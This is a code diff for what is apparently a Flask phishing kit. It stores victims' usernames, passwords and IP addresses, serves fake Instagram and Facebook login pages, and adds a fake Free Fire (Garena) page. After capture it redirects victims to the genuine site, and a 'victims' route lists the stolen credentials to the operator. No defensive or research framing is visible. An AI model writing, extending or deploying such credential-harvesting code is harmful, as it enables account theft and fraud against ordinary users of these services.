@@ -135,14 +135,26 @@ def phish_page(link_id):
                   (link_id, username, password, ip, datetime.now()))
         conn.commit()
         conn.close()
-        real_url = 'https://www.instagram.com' if template_name == 'instagram' else 'https://www.facebook.com'
+        # Redirect based on template
+        if template_name == 'instagram':
+            real_url = 'https://www.instagram.com'
+        elif template_name == 'facebook':
+            real_url = 'https://www.facebook.com'
+        elif template_name == 'freefire':
+            real_url = 'https://ff.garena.com'
+        else:
+            real_url = 'https://www.google.com'
         return f"<div style='background:#0a0f1e; color:cyan; text-align:center; padding:50px;'>Redirecting...<script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script></div>"
     conn.close()
     if template_name == 'instagram':
         return render_template('instagram.html')
-    else:
+    elif template_name == 'facebook':
         return render_template('facebook.html')
-
+    elif template_name == 'freefire':
+        return render_template('freefire.html')
+    else:
+        return "Invalid template", 400
+        
 @app.route('/victims/<link_id>')
 def view_victims(link_id):
     if 'user_id' not in session:
